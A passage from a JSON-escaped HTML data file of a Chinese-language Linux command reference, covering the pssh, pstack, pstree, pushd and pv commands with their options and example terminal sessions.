id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">--version：查看版本</span>\n<span class=\"hljs-deletion\">--help：查看帮助，即此信息</span>\n<span class=\"hljs-deletion\">-h：主机文件列表，内容格式”[user@]host[:port]”</span>\n<span class=\"hljs-deletion\">-H：主机字符串，内容格式”[user@]host[:port]”</span>\n<span class=\"hljs-deletion\">-：登录使用的用户名</span>\n<span class=\"hljs-deletion\">-p：并发的线程数【可选】</span>\n<span class=\"hljs-deletion\">-o：输出的文件目录【可选】</span>\n<span class=\"hljs-deletion\">-e：错误输入文件【可选】</span>\n<span class=\"hljs-deletion\">-t：TIMEOUT 超时时间设置，0无限制【可选】</span>\n<span class=\"hljs-deletion\">-O：SSH的选项</span>\n<span class=\"hljs-deletion\">-v：详细模式</span>\n<span class=\"hljs-deletion\">-A：手动输入密码模式</span>\n<span class=\"hljs-deletion\">-x：额外的命令行参数使用空白符号，引号，反斜线处理</span>\n<span class=\"hljs-deletion\">-X：额外的命令行参数，单个参数模式，同-x</span>\n<span class=\"hljs-deletion\">-i：每个服务器内部处理信息输出</span>\n<span class=\"hljs-deletion\">-P：打印出服务器返回信息</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>获取每台服务器的uptime：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># pssh -h ip.txt -i uptime</span>\n[1] 11:15:03 [SUCCESS] Mar.mars.he\n11:15:11 up<span class=\"hljs-number\"> 4 </span>days, 16:25, <span class=\"hljs-number\"> 1 </span>user,  load average: 0.00, 0.00, 0.00\n[2] 11:15:03 [SUCCESS] Jan.mars.he\n11:15:12 up<span class=\"hljs-number\"> 3 </span>days, 23:26, <span class=\"hljs-number\"> 0 </span>users,  load average: 0.00, 0.00, 0.00\n[3] 11:15:03 [SUCCESS] Feb.mars.he\n11:15:12 up<span class=\"hljs-number\"> 4 </span>days, 16:26, <span class=\"hljs-number\"> 2 </span>users,  load average: 0.08, 0.02, 0.01\n</code></pre>\n<p>查看每台服务器上mysql复制IO/SQL线程运行状态信息：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># pssh -h IP.txt -i \"/usr/local/mysql/bin/mysql -e 'show slave status \\G'\"|grep Running:</span>\n             <span class=\"hljs-attr\">Slave_IO_Running:</span> <span class=\"hljs-literal\">yes</span>\n            <span class=\"hljs-attr\">Slave_SQL_Running:</span> <span class=\"hljs-literal\">Yes</span>\n             <span class=\"hljs-attr\">Slave_IO_Running:</span> <span class=\"hljs-literal\">Yes</span>\n            <span class=\"hljs-attr\">Slave_SQL_Running:</span> <span class=\"hljs-literal\">Yes</span>\n             <span class=\"hljs-attr\">Slave_IO_Running:</span> <span class=\"hljs-literal\">Yes</span>\n            <span class=\"hljs-attr\">Slave_SQL_Running:</span> <span class=\"hljs-literal\">Yes</span>\n</code></pre>\n<p>保存每台服务器运行的结果：</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># pssh -h IP.txt -i -o /tmp/pssh/ uptime</span>\n[1] 11:19:47 [SUCCESS] Feb.mars.he\n11:19:55 up<span class=\"hljs-number\"> 4 </span>days, 16:31, <span class=\"hljs-number\"> 2 </span>users,  load average: 0.02, 0.03, 0.00\n[2] 11:19:47 [SUCCESS] Jan.mars.he\n11:19:56 up<span class=\"hljs-number\"> 3 </span>days, 23:30, <span class=\"hljs-number\"> 0 </span>users,  load average: 0.01, 0.00, 0.00\n[3] 11:19:47 [SUCCESS] Mar.mars.he\n11:19:56 up<span class=\"hljs-number\"> 4 </span>days, 16:30, <span class=\"hljs-number\"> 1 </span>user,  load average: 0.00, 0.00, 0.00\n</code></pre>\n<p>我们来看一下/tmp/pssh/下的文件及其内容</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># ll /tmp/pssh/</span>\n总用量 12\n-rw-r--r--.<span class=\"hljs-number\"> 1 </span>root root<span class=\"hljs-number\"> 70 </span>12月 <span class=\"hljs-number\"> 1 </span>11:19 Feb.mars.he\n-rw-r--r--.<span class=\"hljs-number\"> 1 </span>root root<span class=\"hljs-number\"> 70 </span>12月 <span class=\"hljs-number\"> 1 </span>11:19 Jan.mars.he\n-rw-r--r--.<span class=\"hljs-number\"> 1 </span>root root<span class=\"hljs-number\"> 69 </span>12月 <span class=\"hljs-number\"> 1 </span>11:19 Mar.mars.he\n\n<span class=\"hljs-comment\"># cat /tmp/pssh/*</span>\n11:19:55 up<span class=\"hljs-number\"> 4 </span>days, 16:31, <span class=\"hljs-number\"> 2 </span>users,  load average: 0.02, 0.03, 0.00\n11:19:56 up<span class=\"hljs-number\"> 3 </span>days, 23:30, <span class=\"hljs-number\"> 0 </span>users,  load average: 0.01, 0.00, 0.00\n11:19:56 up<span class=\"hljs-number\"> 4 </span>days, 16:30, <span class=\"hljs-number\"> 1 </span>user,  load average: 0.00, 0.00, 0.00\n</code></pre>\n<p>上面介绍的是pssh命令很少的一部分，大家可以将其用到适合自己的场景，发挥它的最大功效。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pstack",
        "des": "显示每个进程的栈跟踪",
        "body": "<h1 id=\"pstack\">pstack</h1>\n<p>显示每个进程的栈跟踪</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pstack命令</strong> 可显示每个进程的栈跟踪。<kbd>pstack</kbd> 命令必须由相应进程的属主或 <tt>root</tt> 运行。可以使用 <kbd>pstack</kbd> 来确定进程挂起的位置。此命令允许使用的唯一选项是要检查的进程的 <tt>PID</tt>。</p>\n<p>命令软件包下载地址：<a href=\"https://packages.debian.org/sid/pstack\">https://packages.debian.org/sid/pstack</a></p>\n<h3 id=\"实例\">实例</h3>\n<p>pstree以树结构显示进程</p>\n<pre><code class=\"language-shell\">pstree -p work | grep ad\n<span class=\"hljs-function\"><span class=\"hljs-title\">sshd</span><span class=\"hljs-params\">(<span class=\"hljs-number\">22669</span>)</span>---<span class=\"hljs-title\">bash</span><span class=\"hljs-params\">(<span class=\"hljs-number\">22670</span>)</span>---<span class=\"hljs-title\">ad_preprocess</span><span class=\"hljs-params\">(<span class=\"hljs-number\">4551</span>)</span>-+-{<span class=\"hljs-title\">ad_preprocess</span>}<span class=\"hljs-params\">(<span class=\"hljs-number\">4552</span>)</span>\n                                                |-{<span class=\"hljs-title\">ad_preprocess</span>}<span class=\"hljs-params\">(<span class=\"hljs-number\">4553</span>)</span>\n                                                |-{<span class=\"hljs-title\">ad_preprocess</span>}<span class=\"hljs-params\">(<span class=\"hljs-number\">4554</span>)</span>\n                                                |-{<span class=\"hljs-title\">ad_preprocess</span>}<span class=\"hljs-params\">(<span class=\"hljs-number\">4555</span>)</span>\n                                                |-{<span class=\"hljs-title\">ad_preprocess</span>}<span class=\"hljs-params\">(<span class=\"hljs-number\">4556</span>)</span>\n                                                `-{<span class=\"hljs-title\">ad_preprocess</span>}<span class=\"hljs-params\">(<span class=\"hljs-number\">4557</span>)</span></span>\n</code></pre>\n<p>work为工作用户，-p为显示进程识别码，ad_preprocess共启动了6个子线程，加上主线程共7个线程。</p>\n<pre><code class=\"language-shell\"><span class=\"hljs-attribute\">ps</span> -Lf <span class=\"hljs-number\">4551</span>\n<span class=\"hljs-attribute\">UID</span>        PID  PPID   LWP  C NLWP STIME TTY      stat   time CMD\n<span class=\"hljs-attribute\">work</span>      <span class=\"hljs-number\">4551</span> <span class=\"hljs-number\">22670</span>  <span class=\"hljs-number\">4551</span>  <span class=\"hljs-number\">2</span>    <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">30</span> pts/<span class=\"hljs-number\">2</span>    Sl+    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">02</span> ./ad_preprocess\n<span class=\"hljs-attribute\">work</span>      <span class=\"hljs-number\">4551</span> <span class=\"hljs-number\">22670</span>  <span class=\"hljs-number\">4552</span>  <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">30</span> pts/<span class=\"hljs-number\">2</span>    Sl+    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span> ./ad_preprocess\n<span class=\"hljs-attribute\">work</span>      <span class=\"hljs-number\">4551</span> <span class=\"hljs-number\">22670</span>  <span class=\"hljs-number\">4553</span>  <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">30</span> pts/<span class=\"hljs-number\">2</span>    Sl+    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span> ./ad_preprocess\n<span class=\"hljs-attribute\">work</span>      <span class=\"hljs-number\">4551</span> <span class=\"hljs-number\">22670</span>  <span class=\"hljs-number\">4554</span>  <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">30</span> pts/<span class=\"hljs-number\">2</span>    Sl+    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span> ./ad_preprocess\n<span class=\"hljs-attribute\">work</span>      <span class=\"hljs-number\">4551</span> <span class=\"hljs-number\">22670</span>  <span class=\"hljs-number\">4555</span>  <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">30</span> pts/<span class=\"hljs-number\">2</span>    Sl+    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span> ./ad_preprocess\n<span class=\"hljs-attribute\">work</span>      <span class=\"hljs-number\">4551</span> <span class=\"hljs-number\">22670</span>  <span class=\"hljs-number\">4556</span>  <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">30</span> pts/<span class=\"hljs-number\">2</span>    Sl+    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span> ./ad_preprocess\n<span class=\"hljs-attribute\">work</span>      <span class=\"hljs-number\">4551</span> <span class=\"hljs-number\">22670</span>  <span class=\"hljs-number\">4557</span>  <span class=\"hljs-number\">0</span>    <span class=\"hljs-number\">7</span> <span class=\"hljs-number\">16</span>:<span class=\"hljs-number\">30</span> pts/<span class=\"hljs-number\">2</span>    Sl+    <span class=\"hljs-number\">0</span>:<span class=\"hljs-number\">00</span> ./ad_preprocess\n</code></pre>\n<p>进程共启动了7个线程</p>\n<p>pstack显示每个进程的栈跟踪：</p>\n<pre><code class=\"language-shell\">pstack <span class=\"hljs-number\">4551</span>\n<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">7</span> (<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">1084229984</span> (LWP <span class=\"hljs-number\">4552</span>)):\n#0  <span class=\"hljs-number\">0x000000302afc63dc</span> <span class=\"hljs-keyword\">in</span> epoll_wait () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#1  <span class=\"hljs-number\">0x00000000006f0730</span> <span class=\"hljs-keyword\">in</span> ub<span class=\"hljs-type\">::EPollEx</span><span class=\"hljs-type\">::poll</span> ()\n#2  <span class=\"hljs-number\">0x00000000006f172a</span> <span class=\"hljs-keyword\">in</span> ub<span class=\"hljs-type\">::NetReactor</span><span class=\"hljs-type\">::callback</span> ()\n#3  <span class=\"hljs-number\">0x00000000006fbbbb</span> <span class=\"hljs-keyword\">in</span> ub<span class=\"hljs-type\">::UBTask</span><span class=\"hljs-type\">::CALLBACK</span> ()\n#4  <span class=\"hljs-number\">0x000000302b80610a</span> <span class=\"hljs-keyword\">in</span> start_thread () from /lib64/tls/libpthread.so<span class=\"hljs-number\">.0</span>\n#5  <span class=\"hljs-number\">0x000000302afc6003</span> <span class=\"hljs-keyword\">in</span> clone () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#6  <span class=\"hljs-number\">0x0000000000000000</span> <span class=\"hljs-keyword\">in</span> ?? ()\n<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">6</span> (<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">1094719840</span> (LWP <span class=\"hljs-number\">4553</span>)):\n#0  <span class=\"hljs-number\">0x000000302afc63dc</span> <span class=\"hljs-keyword\">in</span> epoll_wait () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#1  <span class=\"hljs-number\">0x00000000006f0730</span> <span class=\"hljs-keyword\">in</span> ub<span class=\"hljs-type\">::EPollEx</span><span class=\"hljs-type\">::poll</span> ()\n#2  <span class=\"hljs-number\">0x00000000006f172a</span> <span class=\"hljs-keyword\">in</span> ub<span class=\"hljs-type\">::NetReactor</span><span class=\"hljs-type\">::callback</span> ()\n#3  <span class=\"hljs-number\">0x00000000006fbbbb</span> <span class=\"hljs-keyword\">in</span> ub<span class=\"hljs-type\">::UBTask</span><span class=\"hljs-type\">::CALLBACK</span> ()\n#4  <span class=\"hljs-number\">0x000000302b80610a</span> <span class=\"hljs-keyword\">in</span> start_thread () from /lib64/tls/libpthread.so<span class=\"hljs-number\">.0</span>\n#5  <span class=\"hljs-number\">0x000000302afc6003</span> <span class=\"hljs-keyword\">in</span> clone () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#6  <span class=\"hljs-number\">0x0000000000000000</span> <span class=\"hljs-keyword\">in</span> ?? ()\n<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">5</span> (<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">1105209696</span> (LWP <span class=\"hljs-number\">4554</span>)):\n#0  <span class=\"hljs-number\">0x000000302b80baa5</span> <span class=\"hljs-keyword\">in</span> __nanosleep_nocancel ()\n#1  <span class=\"hljs-number\">0x000000000079e758</span> <span class=\"hljs-keyword\">in</span> comcm<span class=\"hljs-type\">::ms_sleep</span> ()\n#2  <span class=\"hljs-number\">0x00000000006c8581</span> <span class=\"hljs-keyword\">in</span> ub<span class=\"hljs-type\">::UbClientManager</span><span class=\"hljs-type\">::healthyCheck</span> ()\n#3  <span class=\"hljs-number\">0x00000000006c8471</span> <span class=\"hljs-keyword\">in</span> ub<span class=\"hljs-type\">::UbClientManager</span><span class=\"hljs-type\">::start_healthy_check</span> ()\n#4  <span class=\"hljs-number\">0x000000302b80610a</span> <span class=\"hljs-keyword\">in</span> start_thread () from /lib64/tls/libpthread.so<span class=\"hljs-number\">.0</span>\n#5  <span class=\"hljs-number\">0x000000302afc6003</span> <span class=\"hljs-keyword\">in</span> clone () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#6  <span class=\"hljs-number\">0x0000000000000000</span> <span class=\"hljs-keyword\">in</span> ?? ()\n<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">4</span> (<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">1115699552</span> (LWP <span class=\"hljs-number\">4555</span>)):\n#0  <span class=\"hljs-number\">0x000000302b80baa5</span> <span class=\"hljs-keyword\">in</span> __nanosleep_nocancel ()\n#1  <span class=\"hljs-number\">0x0000000000482b0e</span> <span class=\"hljs-keyword\">in</span> armor<span class=\"hljs-type\">::armor_check_thread</span> ()\n#2  <span class=\"hljs-number\">0x000000302b80610a</span> <span class=\"hljs-keyword\">in</span> start_thread () from /lib64/tls/libpthread.so<span class=\"hljs-number\">.0</span>\n#3  <span class=\"hljs-number\">0x000000302afc6003</span> <span class=\"hljs-keyword\">in</span> clone () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#4  <span class=\"hljs-number\">0x0000000000000000</span> <span class=\"hljs-keyword\">in</span> ?? ()\n<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">3</span> (<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">1126189408</span> (LWP <span class=\"hljs-number\">4556</span>)):\n#0  <span class=\"hljs-number\">0x000000302af8f1a5</span> <span class=\"hljs-keyword\">in</span> __nanosleep_nocancel () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#1  <span class=\"hljs-number\">0x000000302af8f010</span> <span class=\"hljs-keyword\">in</span> sleep () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#2  <span class=\"hljs-number\">0x000000000044c972</span> <span class=\"hljs-keyword\">in</span> Business_config_manager<span class=\"hljs-type\">::run</span> ()\n#3  <span class=\"hljs-number\">0x0000000000457b83</span> <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">Thread</span><span class=\"hljs-type\">::run_thread</span> ()\n#4  <span class=\"hljs-number\">0x000000302b80610a</span> <span class=\"hljs-keyword\">in</span> start_thread () from /lib64/tls/libpthread.so<span class=\"hljs-number\">.0</span>\n#5  <span class=\"hljs-number\">0x000000302afc6003</span> <span class=\"hljs-keyword\">in</span> clone () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#6  <span class=\"hljs-number\">0x0000000000000000</span> <span class=\"hljs-keyword\">in</span> ?? ()\n<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">2</span> (<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">1136679264</span> (LWP <span class=\"hljs-number\">4557</span>)):\n#0  <span class=\"hljs-number\">0x000000302af8f1a5</span> <span class=\"hljs-keyword\">in</span> __nanosleep_nocancel () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#1  <span class=\"hljs-number\">0x000000302af8f010</span> <span class=\"hljs-keyword\">in</span> sleep () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#2  <span class=\"hljs-number\">0x00000000004524bb</span> <span class=\"hljs-keyword\">in</span> Process_thread<span class=\"hljs-type\">::sleep_period</span> ()\n#3  <span class=\"hljs-number\">0x0000000000452641</span> <span class=\"hljs-keyword\">in</span> Process_thread<span class=\"hljs-type\">::run</span> ()\n#4  <span class=\"hljs-number\">0x0000000000457b83</span> <span class=\"hljs-keyword\">in</span> <span class=\"hljs-keyword\">Thread</span><span class=\"hljs-type\">::run_thread</span> ()\n#5  <span class=\"hljs-number\">0x000000302b80610a</span> <span class=\"hljs-keyword\">in</span> start_thread () from /lib64/tls/libpthread.so<span class=\"hljs-number\">.0</span>\n#6  <span class=\"hljs-number\">0x000000302afc6003</span> <span class=\"hljs-keyword\">in</span> clone () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#7  <span class=\"hljs-number\">0x0000000000000000</span> <span class=\"hljs-keyword\">in</span> ?? ()\n<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">1</span> (<span class=\"hljs-keyword\">Thread</span> <span class=\"hljs-number\">182894129792</span> (LWP <span class=\"hljs-number\">4551</span>)):\n#0  <span class=\"hljs-number\">0x000000302af8f1a5</span> <span class=\"hljs-keyword\">in</span> __nanosleep_nocancel () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#1  <span class=\"hljs-number\">0x000000302af8f010</span> <span class=\"hljs-keyword\">in</span> sleep () from /lib64/tls/libc.so<span class=\"hljs-number\">.6</span>\n#2  <span class=\"hljs-number\">0x0000000000420d79</span> <span class=\"hljs-keyword\">in</span> Ad_preprocess<span class=\"hljs-type\">::run</span> ()\n#3  <span class=\"hljs-number\">0x0000000000450ad0</span> <span class=\"hljs-keyword\">in</span> main ()\n</code></pre>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->"
    },
    {
        "title": "pstree",
        "des": "以树状图的方式展现进程之间的派生关系",
        "body": "<h1 id=\"pstree\">pstree</h1>\n<p>以树状图的方式展现进程之间的派生关系</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pstree命令</strong> 以树状图的方式展现进程之间的派生关系，显示效果比较直观。</p>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pstree</span><span class=\"hljs-params\">(选项)</span></span>\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-a：显示每个程序的完整指令，包含路径，参数或是常驻服务的标示；</span>\n<span class=\"hljs-deletion\">-c：不使用精简标示法；</span>\n<span class=\"hljs-deletion\">-G：使用VT100终端机的列绘图字符；</span>\n<span class=\"hljs-deletion\">-h：列出树状图时，特别标明现在执行的程序；</span>\n<span class=\"hljs-deletion\">-H&lt;程序识别码&gt;：此参数的效果和指定\"-h\"参数类似，但特别标明指定的程序；</span>\n<span class=\"hljs-deletion\">-l：采用长列格式显示树状图；</span>\n<span class=\"hljs-deletion\">-n：用程序识别码排序。预设是以程序名称来排序；</span>\n<span class=\"hljs-deletion\">-p：显示程序识别码；</span>\n<span class=\"hljs-deletion\">-u：显示用户名称；</span>\n<span class=\"hljs-deletion\">-U：使用UTF-8列绘图字符；</span>\n<span class=\"hljs-deletion\">-V：显示版本信息。</span>\n</code></pre>\n<h3 id=\"实例\">实例</h3>\n<p>显示当前所有进程的进程号和进程id</p>\n<pre><code class=\"language-shell\">pstree -<span class=\"hljs-selector-tag\">p</span>\n</code></pre>\n<p>显示所有进程的所有详细信息，遇到相同的进程名可以压缩显示。</p>\n<pre><code class=\"language-shellbash\">pstree  -<span class=\"hljs-selector-tag\">a</span>\n</code></pre>\n<p>获取 SSH 会话的 PID</p>\n<pre><code class=\"language-shell\">pstree -p | grep ssh\n\n<span class=\"hljs-attr\">#  |-sshd(1221</span>)-+-sshd<span class=\"hljs-comment\">(2768)</span>---bash<span class=\"hljs-comment\">(2770)</span>-+-grep<span class=\"hljs-comment\">(2810)</span>\n<span class=\"hljs-attr\">#  |            `-sshd(2807</span>)---sshd<span class=\"hljs-comment\">(2808)</span>\n</code></pre>\n<p>从上方的输出中，你可以看到 sshd 进程与分支的树形图。sshd 的主进程是 sshd（1221），另两个分支分别为 sshd（2768） 和 sshd（2807）。</p>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "pushd",
        "des": "将目录添加到目录堆栈顶部。",
        "body": "<h1 id=\"pushd\">pushd</h1>\n<p>将目录添加到目录堆栈顶部。</p>\n<h2 id=\"概要\">概要</h2>\n<pre><code class=\"language-shell\">pushd [-<span class=\"hljs-built_in\">n</span>] [+<span class=\"hljs-built_in\">N</span> | -<span class=\"hljs-built_in\">N</span> | dir]\n</code></pre>\n<h2 id=\"主要用途\">主要用途</h2>\n<ul>\n<li><p>将目录添加到目录堆栈顶部，切换当前工作目录到该目录。</p>\n</li>\n<li><p>旋转目录堆栈，使堆栈的新顶部成为当前工作目录。</p>\n</li>\n<li><p>没有参数时，交换目录堆栈的前两个目录。</p>\n</li>\n</ul>\n<h2 id=\"选项\">选项</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-deletion\">-n    抑制添加目录引起的当前工作目录变化。</span>\n</code></pre>\n<h2 id=\"参数\">参数</h2>\n<p>+N（可选）：不带参数执行<code>dirs</code>命令显示的列表中，左起的第N个目录将作为堆栈顶部，在它前面的会移动到底部。（从0开始计数）</p>\n<p>-N（可选）：不带参数执行<code>dirs</code>命令显示的列表中，右起的第N个目录将作为堆栈顶部，在它前面的会移动到底部。（从0开始计数）</p>\n<p>dir（可选）：要推送的目录。</p>\n<h2 id=\"返回值\">返回值</h2>\n<p>返回成功除非提供了非法选项或执行出现错误。</p>\n<h2 id=\"例子\">例子</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 添加目录到堆栈，改变了当前工作目录。</span>\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>dirs\n~\n[user2<span class=\"hljs-variable\">@pc</span> ~]<span class=\"hljs-variable\">$ </span>pushd ~<span class=\"hljs-regexp\">/Desktop\n~/</span>Desktop ~\n[user2<span class=\"hljs-variable\">@pc</span> Desktop]<span class=\"hljs-variable\">$ </span>\n</code></pre>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># 添加目录到堆栈，当前工作目录不变。</span>\n[user2@pc ~]$ dirs\n~\n[user2@pc ~]$ pushd -n ~<span class=\"hljs-string\">/Desktop</span>\n~ ~<span class=\"hljs-string\">/Desktop</span>\n[user2@pc ~]$ pushd -n ~<span class=\"hljs-string\">/Pictures</span>\n~ ~<span class=\"hljs-string\">/Pictures</span> ~<span class=\"hljs-string\">/Desktop</span>\n\n<span class=\"hljs-comment\"># 调整顺序。</span>\n[user2@pc ~]$ pushd +1\n~<span class=\"hljs-string\">/Pictures</span> ~<span class=\"hljs-string\">/Desktop</span> ~\n[user2@pc ~]$ pushd -1\n~<span class=\"hljs-string\">/Desktop</span> ~ ~<span class=\"hljs-string\">/Pictures</span>\n[user2@pc ~]$ pushd\n~ ~<span class=\"hljs-string\">/Desktop</span> ~<span class=\"hljs-string\">/Pictures</span>\n</code></pre>\n<h3 id=\"注意\">注意</h3>\n<ol>\n<li><code>bash</code>的目录堆栈命令包括<code>dirs popd pushd</code>。</li>\n<li>当前目录始终是目录堆栈的顶部。</li>\n<li>该命令是bash内建命令，相关的帮助信息请查看<code>help</code>命令。</li>\n</ol>\n<h3 id=\"参考链接\">参考链接</h3>\n<ul>\n<li><a href=\"https://superuser.com/questions/784450/popd-and-pushd-behavior-with-n-option\">popd、pushd命令'-n'选项的行为</a></li>\n</ul>\n<!-- Linux命令行搜索引擎：https://jaywcjlove.github.io/linux-command/ -->\n"
    },
    {
        "title": "pv",
        "des": "显示当前在命令行执行的命令的进度信息，管道查看器",
        "body": "<h1 id=\"pv\">pv</h1>\n<p>显示当前在命令行执行的命令的进度信息，管道查看器</p>\n<h2 id=\"补充说明\">补充说明</h2>\n<p><strong>pv命令</strong>  Pipe Viewer 的简称，由Andrew Wood 开发。意思是通过管道显示数据处理进度的信息。这些信息包括已经耗费的时间，完成的百分比(通过进度条显示)，当前的速度，全部传输的数据，以及估计剩余的时间。</p>\n<h2 id=\"下载安装\">下载安装</h2>\n<pre><code class=\"language-shell\"><span class=\"hljs-comment\"># Debian 系的操作系统，如 Ubuntu</span>\nsudo apt-get <span class=\"hljs-keyword\">install</span> pv\n\n<span class=\"hljs-comment\"># RedHat系的则这样：</span>\nyum <span class=\"hljs-keyword\">install</span> pv\n</code></pre>\n<h3 id=\"语法\">语法</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-function\"><span class=\"hljs-title\">pv</span><span class=\"hljs-params\">(选项)</span><span class=\"hljs-params\">(参数)</span></span>\npv <span class=\"hljs-selector-attr\">[OPTION]</span> <span class=\"hljs-selector-attr\">[FILE]</span>...\n</code></pre>\n<h3 id=\"选项\">选项</h3>\n<pre><code class=\"language-shell\"><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">p</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">progress</span>           <span class=\"hljs-comment\">显示进度条</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">t</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">timer</span>              <span class=\"hljs-comment\">显示已用时间</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">e</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">eta</span>                <span class=\"hljs-comment\">显示预计到达时间</span> <span class=\"hljs-comment\">(完成)</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">I</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">fineta</span>             <span class=\"hljs-comment\">显示绝对估计到达时间</span>\n                         <span class=\"hljs-comment\">(完成)</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">r</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">rate</span>               <span class=\"hljs-comment\">显示数据传输速率计数器</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">a</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">average</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">rate</span>       <span class=\"hljs-comment\">显示数据传输平均速率计数器</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">b</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">bytes</span>              <span class=\"hljs-comment\">显示传输的字节数</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">T</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">buffer</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">percent</span>     <span class=\"hljs-comment\">显示正在使用的传输缓冲区百分比</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">A</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">last</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">written</span> <span class=\"hljs-comment\">NUM</span>   <span class=\"hljs-comment\">显示上次写入的字节数</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">F</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">format</span> <span class=\"hljs-comment\">FORMAT</span>      <span class=\"hljs-comment\">将输出格式设置为FORMAT</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">n</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">numeric</span>            <span class=\"hljs-comment\">输出百分比</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">q</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">quiet</span>              <span class=\"hljs-comment\">不输出任何信息</span>\n\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">W</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">wait</span>               <span class=\"hljs-comment\">在传输第一个字节之前不显示任何内容</span>\n<span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">D</span><span class=\"hljs-string\">,</span> --<span class=\"hljs-comment\">delay</span><span class=\"hljs-literal\">-</span><span class=\"hljs-comment\">start</span> <span 